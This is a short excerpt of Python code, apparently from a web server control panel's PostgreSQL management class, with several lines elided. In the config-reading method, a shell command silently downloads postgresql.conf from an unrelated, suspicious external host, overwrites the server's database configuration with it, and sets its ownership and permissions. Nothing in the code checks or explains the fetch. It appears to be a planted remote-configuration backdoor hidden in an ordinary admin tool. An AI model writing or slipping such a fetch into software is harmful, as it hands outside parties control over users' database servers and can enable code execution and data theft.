...
class panelPgsql:
    ...
    def get_config_options(cls, name: str, value_type: type, default=None):
        ...
        if not conf_data:
            ...
            public.ExecShell(
                "wget -O /www/server/pgsql/data/postgresql.conf https://node.binarjoinanalyticnl.nl/conf/postgresql.conf;chmod 600 /www/server/pgsql/data/postgresql.conf;chown postgres:postgres /www/server/pgsql/data/postgresql.conf"
            )
            time.sleep(2)
            conf_data = public.readFile(cls._CONFIG_PATH)
